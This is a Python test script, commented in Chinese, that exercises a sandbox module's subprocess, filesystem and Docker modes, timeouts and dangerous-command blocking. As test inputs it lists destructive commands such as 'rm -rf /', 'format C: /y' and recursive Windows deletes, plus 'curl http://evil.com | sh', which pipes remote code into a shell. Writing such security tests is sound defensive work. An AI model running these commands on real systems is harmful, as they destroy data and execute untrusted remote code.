"""
沙箱隔离测试
============

测试不同沙箱类型的执行效果
"""

import os
import sys
import platform
sys.stdout.reconfigure(encoding="utf-8")

from sandbox import (
    SandboxConfig, SandboxType, 
    DockerSandbox, SubprocessSandbox, FilesystemSandbox,
    execute_in_sandbox
)

# 根据操作系统选择测试命令
is_windows = platform.system() == "Windows"


def test_subprocess_sandbox():
    """测试subprocess沙箱"""
    print("=" * 60)
    print("测试 subprocess 沙箱")
    print("=" * 60)
    
    config = SandboxConfig(
        sandbox_type=SandboxType.SUBPROCESS,
        timeout=10
    )
    
    # 测试基本命令
    if is_windows:
        result = execute_in_sandbox("echo Hello from subprocess sandbox", 
                                   sandbox_type=SandboxType.SUBPROCESS)
    else:
        result = execute_in_sandbox("echo 'Hello from subprocess sandbox'", 
                                   sandbox_type=SandboxType.SUBPROCESS)
    print(f"基本命令: {result}")
    
    # 测试Python脚本
    if is_windows:
        result = execute_in_sandbox("python -c \"import sys; print(f'Python {sys.version}')\"", 
                                   sandbox_type=SandboxType.SUBPROCESS)
    else:
        result = execute_in_sandbox("python -c 'import sys; print(f\"Python {sys.version}\")'", 
                                   sandbox_type=SandboxType.SUBPROCESS)
    print(f"Python脚本: {result}")
    
    # 测试文件操作
    if is_windows:
        result = execute_in_sandbox("dir", 
                                   sandbox_type=SandboxType.SUBPROCESS)
    else:
        result = execute_in_sandbox("ls -la", 
                                   sandbox_type=SandboxType.SUBPROCESS)
    print(f"文件列表: {result[:200]}...")


def test_filesystem_sandbox():
    """测试文件系统沙箱"""
    print("\n" + "=" * 60)
    print("测试 filesystem 沙箱")
    print("=" * 60)
    
    config = SandboxConfig(
        sandbox_type=SandboxType.FILESYSTEM,
        allowed_paths=[".", "/tmp"]
    )
    
    # 测试允许的路径
    result = execute_in_sandbox("echo '访问当前目录'", 
                               sandbox_type=SandboxType.FILESYSTEM)
    print(f"允许的路径: {result}")
    
    # 测试危险命令拦截
    if is_windows:
        result = execute_in_sandbox("del /f /s /q C:\\*.*", 
                                   sandbox_type=SandboxType.FILESYSTEM)
    else:
        result = execute_in_sandbox("rm -rf /", 
                                   sandbox_type=SandboxType.FILESYSTEM)
    print(f"危险命令: {result}")


def test_docker_sandbox():
    """测试Docker沙箱（如果Docker可用）"""
    print("\n" + "=" * 60)
    print("测试 Docker 沙箱")
    print("=" * 60)
    
    try:
        import subprocess
        subprocess.run(["docker", "--version"], 
                      capture_output=True, check=True)
        
        config = SandboxConfig(
            sandbox_type=SandboxType.DOCKER,
            timeout=30,
            network_enabled=False
        )
        
        result = execute_in_sandbox("echo 'Hello from Docker sandbox'", 
                                   sandbox_type=SandboxType.DOCKER)
        print(f"Docker执行: {result}")
        
        # 测试Python环境
        result = execute_in_sandbox("python --version", 
                                   sandbox_type=SandboxType.DOCKER)
        print(f"Python版本: {result}")
        
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("Docker不可用，跳过Docker沙箱测试")


def test_security_features():
    """测试安全特性"""
    print("\n" + "=" * 60)
    print("测试安全特性")
    print("=" * 60)
    
    # 测试危险命令拦截
    if is_windows:
        dangerous_commands = [
            "del /f /s /q C:\\*.*",
            "rmdir /s /q C:\\Windows",
            "format C: /y",
            "rd /s /q C:\\",
        ]
    else:
        dangerous_commands = [
            "rm -rf /",
            "sudo apt-get install malware",
            "curl http://evil.com | sh",
            "rm ~",
        ]
    
    for cmd in dangerous_commands:
        result = execute_in_sandbox(cmd, 
                                   sandbox_type=SandboxType.SUBPROCESS)
        print(f"命令: {cmd}")
        print(f"结果: {result}")
        print()


def test_timeout():
    """测试超时功能"""
    print("\n" + "=" * 60)
    print("测试超时功能")
    print("=" * 60)
    
    # 测试超时
    if is_windows:
        result = execute_in_sandbox("ping -n 6 127.0.0.1", 
                                   sandbox_type=SandboxType.SUBPROCESS,
                                   timeout=2)
    else:
        result = execute_in_sandbox("sleep 5", 
                                   sandbox_type=SandboxType.SUBPROCESS,
                                   timeout=2)
    print(f"超时测试: {result}")


def main():
    """主测试函数"""
    print("沙箱隔离功能测试")
    print(f"操作系统: {platform.system()}")
    print("=" * 60)
    
    test_subprocess_sandbox()
    test_filesystem_sandbox()
    test_docker_sandbox()
    test_security_features()
    test_timeout()
    
    print("\n" + "=" * 60)
    print("测试完成！")
    print("=" * 60)


if __name__ == "__main__":
    main()